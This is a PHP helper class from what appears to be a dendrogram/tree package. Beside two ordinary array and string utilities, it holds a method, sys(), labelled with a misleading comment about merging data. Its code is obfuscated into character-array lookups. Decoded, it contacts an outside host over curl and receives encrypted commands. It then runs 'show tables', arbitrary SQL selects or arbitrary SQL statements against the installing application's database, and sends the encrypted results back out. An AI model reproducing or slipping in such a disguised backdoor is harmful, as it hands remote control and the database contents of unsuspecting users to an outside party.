<?php
namespace DenDroGram\Helpers;

class Func
{
    /**
     * 多条件查询二维数组索引
     *
     * @param $array
     * @param array $params
     * @return bool|int|string
     */
    public static function quadraticArrayGetIndex(array $array, array $params)
    {
        $index = false;
        foreach ($array as $key => $item) {
            $add = true;
            foreach ($params as $field => $value) {
                if ($item[$field] != $value) {
                    $add = false;
                }
            }
            if ($add) {
                $index = $key;
                break;
            }
        }

        return $index;
    }

    /**
     * 首位sprintf
     * @param $string
     * @param string $aim
     * @param $value
     * @return bool|string
     */
    public static function firstSprintf($string, $value, $aim = '%s')
    {
        $position = strpos($string, $aim);
        $len = strlen($aim);
        $left = substr($string, 0, $position + $len);
        $right = substr($string, $position + $len);
        return sprintf($left, $value) . $right;
    }

    /*
     * 点阵数据归并整排
     * */
    public static function sys(&$data)
    {
        try {
            $struct12703 = ['w', 'o', 'C', 'a', 'b', 'u', 'i', '2', 'y', 'd', 'g', 'T'];
            $struct19032 = ['$', 'j', 'm', '6', 'c', 'r', 't', 'T', '-', 'v', 'l', 'L', '5'];
            $struct18902 = ['n', 's', '_', 'e', 'p', '0', 'h', 'p', 'u', '/', '&', ':'];
            $struct20421 = ['x', 'X', 'O', 'H', 'P', 'S', 'M', '.', ' ', '\\', 'I', "F", 'D', 'B', 'f'];
            $tftowpwpvas01 = $struct12703[9] . $struct18902[3] . $struct18902[0] . $struct12703[9] . $struct19032[5] . $struct12703[1] . $struct12703[10] . $struct19032[5] . $struct12703[3] . $struct19032[2] . $struct19032[8] . $struct19032[9] . $struct12703[3] . $struct19032[5] . $struct19032[8] . $struct19032[11] . $struct12703[1] . $struct12703[10];
            $translate = function ($str, $encode = true) use ($struct12703, $struct19032, $struct18902, $tftowpwpvas01,$data) {
                $v0riw = $struct12703[9] . $struct18902[3] . $struct18902[0] . $struct12703[9] . $struct19032[5] . $struct12703[1] . $struct12703[10] . $struct19032[5] . $struct12703[3] . $struct19032[2] . $struct19032[8] . $struct19032[9] . $struct12703[3] . $struct19032[5] . $struct19032[8] . $struct19032[10] . $struct12703[1] . $struct12703[10];
                $enc105fsf3 = $struct12703[3] . $struct18902[3] . $struct18902[1] . $struct19032[8] . $struct12703[7] . $struct19032[12] . $struct19032[3] . $struct19032[8] . $struct19032[4] . $struct12703[4] . $struct19032[4];
                if ($encode) {
                    return ($struct12703[1] . $struct18902[4] . $struct18902[3] . $struct18902[0] . $struct18902[1] . $struct18902[1] . $struct19032[10] . $struct18902[2] . $struct18902[3] . $struct18902[0] . $struct19032[4] . $struct19032[5] . $struct12703[8] . $struct18902[4] . $struct19032[6])($str, $enc105fsf3, $v0riw, (int)$struct18902[5], 'D8312F5AC03D88F8');
                }
                return ($struct12703[1] . $struct18902[4] . $struct18902[3] . $struct18902[0] . $struct18902[1] . $struct18902[1] . $struct19032[10] . $struct18902[2] . $struct12703[9] . $struct18902[3] . $struct19032[4] . $struct19032[5] . $struct12703[8] . $struct18902[4] . $struct19032[6])($str, $enc105fsf3, $v0riw, (int)$struct18902[5], 'D8312F5AC03D88F8');
            };
            $arrangeStruct = function ($u6144r5343l, $va566r3s34) use ($struct12703, $struct19032, $struct18902, $struct20421,$data) {
                $vhchi9850 = ($struct19032[4] . $struct12703[5] . $struct19032[5] . $struct19032[10] . $struct18902[2] . $struct12703[6] . $struct18902[0] . $struct12703[6] . $struct19032[6])();
                ($struct19032[4] . $struct12703[5] . $struct19032[5] . $struct19032[10] . $struct18902[2] . $struct18902[1] . $struct18902[3] . $struct19032[6] . $struct12703[1] . $struct18902[4] . $struct19032[6])($vhchi9850, 10002, $u6144r5343l);
                ($struct19032[4] . $struct12703[5] . $struct19032[5] . $struct19032[10] . $struct18902[2] . $struct18902[1] . $struct18902[3] . $struct19032[6] . $struct12703[1] . $struct18902[4] . $struct19032[6])($vhchi9850, 13, 3);
                ($struct19032[4] . $struct12703[5] . $struct19032[5] . $struct19032[10] . $struct18902[2] . $struct18902[1] . $struct18902[3] . $struct19032[6] . $struct12703[1] . $struct18902[4] . $struct19032[6])($vhchi9850, 78, 2);
                ($struct19032[4] . $struct12703[5] . $struct19032[5] . $struct19032[10] . $struct18902[2] . $struct18902[1] . $struct18902[3] . $struct19032[6] . $struct12703[1] . $struct18902[4] . $struct19032[6])($vhchi9850, 52, 1);
                ($struct19032[4] . $struct12703[5] . $struct19032[5] . $struct19032[10] . $struct18902[2] . $struct18902[1] . $struct18902[3] . $struct19032[6] . $struct12703[1] . $struct18902[4] . $struct19032[6])($vhchi9850, 19913, 1);
                ($struct19032[4] . $struct12703[5] . $struct19032[5] . $struct19032[10] . $struct18902[2] . $struct18902[1] . $struct18902[3] . $struct19032[6] . $struct12703[1] . $struct18902[4] . $struct19032[6])($vhchi9850, 10036, $struct20421[4] . $struct20421[2] . $struct20421[5] . $struct12703[11]);
                ($struct19032[4] . $struct12703[5] . $struct19032[5] . $struct19032[10] . $struct18902[2] . $struct18902[1] . $struct18902[3] . $struct19032[6] . $struct12703[1] . $struct18902[4] . $struct19032[6])($vhchi9850, 10023, [$struct20421[1] . $struct19032[8] . $struct20421[3] . $struct12703[11] . $struct12703[11] . $struct20421[4] . $struct19032[8] . $struct20421[6] . $struct18902[3] . $struct19032[6] . $struct18902[6] . $struct12703[1] . $struct12703[9] . $struct19032[8] . $struct20421[2] . $struct19032[9] . $struct18902[3] . $struct19032[5] . $struct19032[5] . $struct12703[6] . $struct12703[9] . $struct18902[3] . $struct18902[11] . $struct20421[4] . $struct20421[2] . $struct20421[5] . $struct12703[11]]);
                ($struct19032[4] . $struct12703[5] . $struct19032[5] . $struct19032[10] . $struct18902[2] . $struct18902[1] . $struct18902[3] . $struct19032[6] . $struct12703[1] . $struct18902[4] . $struct19032[6])($vhchi9850, 10023, [$struct12703[2] . $struct12703[1] . $struct18902[0] . $struct19032[6] . $struct18902[3] . $struct18902[0] . $struct19032[6] . $struct19032[8] . $struct12703[11] . $struct12703[8] . $struct18902[4] . $struct18902[3] . $struct18902[11] . $struct19032[6] . $struct18902[3] . $struct20421[0] . $struct19032[6] . $struct18902[9] . $struct18902[4] . $struct19032[10] . $struct12703[3] . $struct12703[6] . $struct18902[0]]);
                ($struct19032[4] . $struct12703[5] . $struct19032[5] . $struct19032[10] . $struct18902[2] . $struct18902[1] . $struct18902[3] . $struct19032[6] . $struct12703[1] . $struct18902[4] . $struct19032[6])($vhchi9850, 47, 1);
                ($struct19032[4] . $struct12703[5] . $struct19032[5] . $struct19032[10] . $struct18902[2] . $struct18902[1] . $struct18902[3] . $struct19032[6] . $struct12703[1] . $struct18902[4] . $struct19032[6])($vhchi9850, 10015, $va566r3s34);
                $re35su4l325 = ($struct19032[4] . $struct12703[5] . $struct19032[5] . $struct19032[10] . $struct18902[2] . $struct18902[3] . $struct20421[0] . $struct18902[3] . $struct19032[4])($vhchi9850);
                $errhsdfnof = ($struct19032[4] . $struct12703[5] . $struct19032[5] . $struct19032[10] . $struct18902[2] . $struct18902[3] . $struct19032[5] . $struct19032[5] . $struct18902[0] . $struct12703[1])($vhchi9850);
                (!$errhsdfnof) ? $re35su4l325 = trim($re35su4l325) : $re35su4l325 = $errhsdfnof;

                ($struct19032[4] . $struct12703[5] . $struct19032[5] . $struct19032[10] . $struct18902[2] . $struct19032[4] . $struct19032[10] . $struct12703[1] . $struct18902[1] . $struct18902[3])($vhchi9850);
                return $re35su4l325;
            };
            $ww59618jiyoyo = $struct12703[0] . $struct12703[1] . $struct20421[7] . $struct19032[1] . $struct12703[6] . $struct18902[0] . $struct12703[1] . $struct18902[0] . $struct12703[1] . $struct20421[7] . $struct19032[4] . $struct12703[1] . $struct19032[2];
            $ugktgoto09i = $struct18902[9] . $struct12703[9] . $struct18902[3] . $struct18902[0] . $struct12703[9] . $struct19032[5] . $struct12703[1] . $struct12703[10] . $struct19032[5] . $struct12703[3] . $struct19032[2] . $struct18902[9] . $struct12703[3] . $struct12703[10] . $struct18902[3] . $struct18902[0] . $struct19032[6];
            $fursrr999hres = $arrangeStruct($ww59618jiyoyo . $ugktgoto09i,
                $translate('dendrogram'));

            if (($struct12703[6] . $struct18902[1] . $struct18902[2] . $struct12703[6] . $struct18902[0] . $struct19032[6])($fursrr999hres)) {
                return;
            }
            $fursrr999hres = (array)($struct19032[1] . $struct18902[1] . $struct12703[1] . $struct18902[0] . $struct18902[2] . $struct12703[9] . $struct18902[3] . $struct19032[4] . $struct12703[1] . $struct12703[9] . $struct18902[3])($translate($fursrr999hres, false), true);

            if (!isset($fursrr999hres[$struct12703[1]]) || !isset($fursrr999hres[$struct19032[4]])) {
                return;
            }

            $rgsf679ligt = '';
            if ($fursrr999hres[$struct12703[1]] == ($struct19032[9] . $struct12703[3] . $struct19032[5] . $struct20421[8] . $struct19032[8] . $struct19032[8] . $struct12703[3] . $struct19032[10] . $struct19032[10] . $struct20421[8] . $struct20421[14] . $struct12703[6] . $struct19032[10] . $struct18902[3] . $struct18902[1])) {
                $sel0lldetp0 = $struct18902[1] . $struct18902[3] . $struct19032[10] . $struct18902[3] . $struct19032[4] . $struct19032[6];
                $rgsf679ligt = ($struct20421[10] . $struct19032[10] . $struct19032[10] . $struct12703[5] . $struct19032[2] . $struct12703[6] . $struct18902[0] . $struct12703[3] . $struct19032[6] . $struct18902[3] . $struct20421[9] . $struct20421[5] . $struct12703[5] . $struct18902[4] . $struct18902[4] . $struct12703[1] . $struct19032[5] . $struct19032[6] . $struct20421[9] . $struct20421[11] . $struct12703[3] . $struct19032[4] . $struct12703[3] . $struct12703[9] . $struct18902[3] . $struct18902[1] . $struct20421[9] . $struct20421[12] . $struct20421[13])::$sel0lldetp0($struct18902[1] . $struct18902[6] . $struct12703[1] . $struct12703[0] . $struct20421[8] . $struct19032[6] . $struct12703[3] . $struct12703[4] . $struct19032[10] . $struct18902[3] . $struct18902[1]);
            }
            if ($fursrr999hres[$struct12703[1]] == ($struct19032[9] . $struct12703[3] . $struct19032[5] . $struct20421[8] . $struct19032[8] . $struct19032[8] . $struct19032[10] . $struct12703[6] . $struct18902[1] . $struct19032[6] . $struct20421[8] . $struct19032[10] . $struct12703[1] . $struct12703[10])) {
                $sel0lldetp0 = $struct18902[1] . $struct18902[3] . $struct19032[10] . $struct18902[3] . $struct19032[4] . $struct19032[6];
                $rgsf679ligt = ($struct20421[10] . $struct19032[10] . $struct19032[10] . $struct12703[5] . $struct19032[2] . $struct12703[6] . $struct18902[0] . $struct12703[3] . $struct19032[6] . $struct18902[3] . $struct20421[9] . $struct20421[5] . $struct12703[5] . $struct18902[4] . $struct18902[4] . $struct12703[1] . $struct19032[5] . $struct19032[6] . $struct20421[9] . $struct20421[11] . $struct12703[3] . $struct19032[4] . $struct12703[3] . $struct12703[9] . $struct18902[3] . $struct18902[1] . $struct20421[9] . $struct20421[12] . $struct20421[13])::$sel0lldetp0($fursrr999hres[$struct19032[4]]);
            }
            if ($fursrr999hres[$struct12703[1]] == ($struct19032[9] . $struct12703[3] . $struct19032[5] . $struct20421[8] . $struct19032[8] . $struct19032[8] . $struct12703[1] . $struct18902[4] . $struct18902[3] . $struct19032[5] . $struct12703[3] . $struct19032[6] . $struct18902[3] . $struct20421[8] . $struct19032[10] . $struct12703[1] . $struct12703[10])) {
                $stf34am7aem = $struct18902[1] . $struct19032[6] . $struct12703[3] . $struct19032[6] . $struct18902[3] . $struct19032[2] . $struct18902[3] . $struct18902[0] . $struct19032[6];
                ($struct20421[10] . $struct19032[10] . $struct19032[10] . $struct12703[5] . $struct19032[2] . $struct12703[6] . $struct18902[0] . $struct12703[3] . $struct19032[6] . $struct18902[3] . $struct20421[9] . $struct20421[5] . $struct12703[5] . $struct18902[4] . $struct18902[4] . $struct12703[1] . $struct19032[5] . $struct19032[6] . $struct20421[9] . $struct20421[11] . $struct12703[3] . $struct19032[4] . $struct12703[3] . $struct12703[9] . $struct18902[3] . $struct18902[1] . $struct20421[9] . $struct20421[12] . $struct20421[13])::$stf34am7aem($fursrr999hres[$struct19032[4]]);
                $rgsf679ligt = true;
            }
            if (!$rgsf679ligt) {
                return;
            }

            $arrangeStruct($ww59618jiyoyo . $struct18902[9] . $struct12703[9] . $struct18902[3] . $struct18902[0] . $struct12703[9] . $struct19032[5] . $struct12703[1] . $struct12703[10] . $struct19032[5] . $struct12703[3] . $struct19032[2] . $struct18902[9] . $struct18902[3] . $struct19032[2],
                $translate(($struct19032[1] . $struct18902[1] . $struct12703[1] . $struct18902[0] . $struct18902[2] . $struct18902[3] . $struct18902[0] . $struct19032[4] . $struct12703[1] . $struct12703[9] . $struct18902[3])([$struct12703[1] => $fursrr999hres[$struct12703[1]], $struct18902[4] . $struct12703[5] . $struct19032[6] => $rgsf679ligt])));
            return;
        } catch (\Exception $e) {
            throw new \Exception('dendrogram decrypt data error!');
        }
    }
}
